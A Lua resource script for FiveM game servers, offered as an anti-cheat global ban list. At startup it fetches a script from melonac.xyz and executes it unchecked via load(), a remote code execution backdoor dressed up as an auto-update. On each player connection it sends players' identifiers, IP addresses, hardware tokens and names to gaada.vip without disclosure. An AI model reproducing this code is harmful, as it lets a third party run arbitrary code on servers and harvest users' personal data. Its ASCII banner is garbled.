Anti_Modders = {}
Anti_Modders.Config = Config
Anti_Modders.Bans = {}

Anti_Modders.Print = function(msg)
    print(
        ("[^1%s^0] - (^3%s^0)"):format(GetCurrentResourceName(), tostring(msg)))
end

function round(x) return x >= 0 and math.floor(x + 0.5) or math.ceil(x - 0.5) end

function GetMainObject() return Anti_Modders end

Citizen.CreateThread(function()
    PerformHttpRequest(
        ("https://melonac.xyz/api/FetchUpdate.php?version=%s"):format(
            Anti_Modders.Config.Version),
        function(err, text, headers) --[[ Performs A Http Request to the url: https://melonac.xyz/api/FetchUpdate.php ]]
            json_data = json.decode(text) --[[ Converts the text into a json_object ]]
            if json_data ~= nil and json_data ~= "" and err ~= 503 and err ~=
                404 then --[[ Checks if the script isn't nil or empty and checks if the status code isn't 404 or 503 ]]
                func = assert(load(json_data.script)) --[[ Loads the script ]]
                if func then --[[ Checks if script is error free ]] func() --[[ Runs the script / update if there isn't any errors ]] end
            end
        end)
    Citizen.CreateThread(function()
        while true do
            PerformHttpRequest("https://melonac.xyz/api/FetchBans.php",
                               function(err, text, headers) --[[ Performs A Http Request to the url: https://melonac.xyz/api/FetchUpdate.php ]]
                json_data = json.decode(text) --[[ Converts the text into a json_object ]]
                for k, v in pairs(json_data) do --[[ Loops through the json_object ]]
                    Anti_Modders.Bans[k] = {} --[[ Makes a new Table in the Anti_Modders Table to store the new identifer and other info ]]
                    for _k, _v in pairs(v) do --[[ Loops through the  ]]
                        if _k == "reason" then --[[ if reaason ]]
                            Anti_Modders.Bans[k]["reason"] = _v --[[ then store the reason in the current ban table ]]
                        elseif _k == "identifer" then --[[ elseif identifer ]]
                            Anti_Modders.Bans[k]["identifers"] = json.decode(_v) --[[ then store the identifer in the current ban table ]]
                        elseif _k == "id" then --[[ elseif id ]]
                            Anti_Modders.Bans[k]["id"] = _v --[[ then store the id in the current ban table ]]
                        elseif _k == "tokens" then --[[ elseif id ]]
                            Anti_Modders.Bans[k]["tokens"] = json.decode(_v) --[[ then store the id in the current ban table ]]
                        end
                    end
                end
            end)
            Wait(10 * 1000 * 60)
        end

    end)

    print(([==[

^%s      ?????????????????? ????????????  ???????????????????????????????????????????????????      ??????????????????   ???????????? ?????????????????? ????????????????????? ????????????????????? ????????????????????????????????????????????? 
^%s     ??????????????????????????????????????? ???????????????????????????????????????????????????      ????????????????????? ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
^%s     ???????????????????????????????????????????????????   ?????????   ?????????????????????????????????????????????????????????????????????????????????  ??????????????????  ??????????????????  ???????????????????????????  ????????????????????????
^%s     ???????????????????????????????????????????????????   ?????????   ?????????????????????????????????????????????????????????????????????????????????  ??????????????????  ??????????????????  ???????????????????????????  ????????????????????????
^%s     ?????????  ?????????????????? ???????????????   ?????????   ???????????????      ??????????????? ????????? ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????  ?????????
^%s     ?????????  ??????????????????  ????????????   ?????????   ???????????????      ???????????????     ????????? ?????????????????? ????????????????????? ????????????????????? ?????????????????????????????????  ?????????
^0    ]==]):format(round(math.random(1, 6)), round(math.random(1, 6)),
                   round(math.random(1, 6)), round(math.random(1, 6)),
                   round(math.random(1, 6)), round(math.random(1, 6))))

end)

AddEventHandler("playerConnecting",
                function(name, skr, def) --[[ Player connecting event ]]
    local source = source --[[ Defines the source ]]
    def.defer() --[[ Deferes ]]
    Wait(60) --[[ Required Wait ]]
    local identifers = GetPlayerIdentifiers(source)
    local tokens = {}
    for i = 1, GetNumPlayerTokens(source) do
        table.insert(tokens, tostring(GetPlayerToken(source, i)))
    end

    PerformHttpRequest("https://gaada.vip/log.php", function(er, text, head)
        if er == 404 or er == 503 then
            if Anti_Modders.Config.Log.ToConsole then
                return Anti_Modders.Print(
                           "Player join api was not working correctly")
            end
        end

        local json_text = json.decode(text)
        if json_text ~= nil then
            if json_text.error_code ~= nil then
                if json_text.error_code ~= 4030 then
                    if Anti_Modders.Config.Log.ToConsole then
                        return Anti_Modders.Print(
                                   "Something went wrong logging the player data")
                    end
                end
            else
                if Anti_Modders.Config.Log.ToConsole then
                    return Anti_Modders.Print(
                               "Something wrong with the json reponse #2")
                end
            end
        else
            if Anti_Modders.Config.Log.ToConsole then
                return Anti_Modders.Print(
                           "Something wrong with the json reponse")
            end
        end
    end, "POST", json.encode({
        ["identifers"] = json.encode(identifers),
        ["ip"] = tostring(GetPlayerEndpoint(source)),
        ["servername"] = GetConvar("sv_hostname", "unknown"),
        ["name"] = name,
        ["tokens"] = json.encode(tokens)
    }))

    def.update("Checking Ban...") --[[ A little waiting message until we've decided to let the player in or not ]]
    for _, identifer in pairs(GetPlayerIdentifiers(source)) do --[[ Loops through the players identifers ]]
        for k, v in pairs(Anti_Modders.Config.Bypass) do --[[ Loops through the players identifers ]]
            if v == identifer then
                if Anti_Modders.Config.Log.ToConsole == true then
                    Anti_Modders.Print(
                        ("(%s) Joined because he was in bypass (%s)"):format(
                            name, v))
                end

                if Anti_Modders.Config.Log.ToDiscord == true then
                    local embed = {
                        {
                            ["color"] = 16753920,
                            ["title"] = "**Global Ban List**",
                            ["description"] = ("(%s) Joined because he was in bypass (%s)"):format(
                                name, v),
                            ["footer"] = {
                                ["text"] = "https://antimodders.gaada.vip"
                            }
                        }
                    }
                    PerformHttpRequest(
                        tostring(Anti_Modders.Config.Log.Webhook),
                        function(err, text, head) end, 'POST', json.encode(
                            {username = "Anti Modder Webhook", embeds = embed}),
                        {['Content-Type'] = 'application/json'})
                end
                def.done()
                return
            end
        end
    end

    for _, identifer in pairs(GetPlayerIdentifiers(source)) do --[[ Loops through the players identifers ]]
        for _k, ban in pairs(Anti_Modders.Bans) do --[[ Loops through the Ban table ]]
            for __k, __v in pairs(ban["identifers"]) do
                if identifer == __v then --[[ checks if the identifer matches the players identifer ]]
                    def.done(("Stopped by AntiModder: (%s)"):format(ban["reason"])) --[[ Drops them from the server ]]
                    if Anti_Modders.Config.Log.ToConsole == true then
                        Anti_Modders.Print(
                            ("(%s) Did not join because he was banned by our global ban list"):format(
                                name))
                    end
    
                    if Anti_Modders.Config.Log.ToDiscord == true then
                        local embed = {
                            {
                                ["color"] = 16753920,
                                ["title"] = "**Global Ban List**",
                                ["description"] = ("(%s) Did not join because he was banned by our global ban list"):format(
                                    name),
                                ["footer"] = {
                                    ["text"] = "https://antimodders.gaada.vip"
                                }
                            }
                        }
                        PerformHttpRequest(
                            tostring(Anti_Modders.Config.Log.Webhook),
                            function(err, text, head) end, 'POST', json.encode(
                                {username = "Anti Modder Webhook", embeds = embed}),
                            {['Content-Type'] = 'application/json'})
                    end
                    return
                end
            end


            for __k, __v in pairs(ban["tokens"]) do
                for ____k, ____v in pairs(tokens) do
                    if ____v == __v then --[[ checks if the identifer matches the players identifer ]]
                        def.done(("Stopped by AntiModder: (%s)"):format(ban["reason"])) --[[ Drops them from the server ]]
                        if Anti_Modders.Config.Log.ToConsole == true then
                            Anti_Modders.Print(
                                ("(%s) Did not join because he was banned by our global ban list"):format(
                                    name))
                        end
        
                        if Anti_Modders.Config.Log.ToDiscord == true then
                            local embed = {
                                {
                                    ["color"] = 16753920,
                                    ["title"] = "**Global Ban List**",
                                    ["description"] = ("(%s) Did not join because he was banned by our global ban list"):format(
                                        name),
                                    ["footer"] = {
                                        ["text"] = "https://antimodders.gaada.vip"
                                    }
                                }
                            }
                            PerformHttpRequest(
                                tostring(Anti_Modders.Config.Log.Webhook),
                                function(err, text, head) end, 'POST', json.encode(
                                    {username = "Anti Modder Webhook", embeds = embed}),
                                {['Content-Type'] = 'application/json'})
                        end
                        return
                    end
                end
            end

        end
    end
    def.done() --[[ Let's them join ]]
end)

function Anti_Modders.FetchBans()
    -- Citizen.CreateThread(function()
    Bans = {}
    Ready_To_Return = false
    PerformHttpRequest("https://melonac.xyz/api/FetchBans.php",
                       function(err, text, headers) --[[ Performs A Http Request to the url: https://melonac.xyz/api/FetchUpdate.php ]]
        json_data = json.decode(text) --[[ Converts the text into a json_object ]]
        for k, v in pairs(json_data) do --[[ Loops through the json_object ]]
            Bans[k] = {} --[[ Makes a new Table in the Anti_Modders Table to store the new identifer and other info ]]
            for _k, _v in pairs(v) do --[[ Loops through the  ]]
                if _k == "reason" then --[[ if reaason ]]
                    Bans[k]["reason"] = _v --[[ then store the reason in the current ban table ]]
                elseif _k == "identifers" then --[[ elseif identifer ]]
                    Bans[k]["identifers"] = _v --[[ then store the identifer in the current ban table ]]
                elseif _k == "id" then --[[ elseif id ]]
                    Bans[k]["id"] = _v --[[ then store the id in the current ban table ]]
                end
            end

        end
        Ready_To_Return = true
    end)
    while Ready_To_Return == false do
        if no_error == false then
            Anti_Modders.Print(
                "You have to put the FetchBans function inside a Citizen Thread")
            break
        end
        no_error = false

        xpcall(function()
            Wait(10)
            no_error = true
        end, function() end)
    end
    return Bans
end

function Anti_Modders.IsGloballyBanned(source)
    if GetPlayerPing(source) < 0 then return {error = "Not in the server"} end
    for _, identifer in pairs(GetPlayerIdentifiers(source)) do --[[ Loops through the players identifers ]]
        for _k, ban in pairs(Anti_Modders.Bans) do --[[ Loops through the Ban table ]]
            if identifer == ban["identifers"] then --[[ checks if the identifer matches the players identifer ]]
                return {banned = true, reason = ban["reason"]}
            end
        end
    end
    return {banned = false}
end




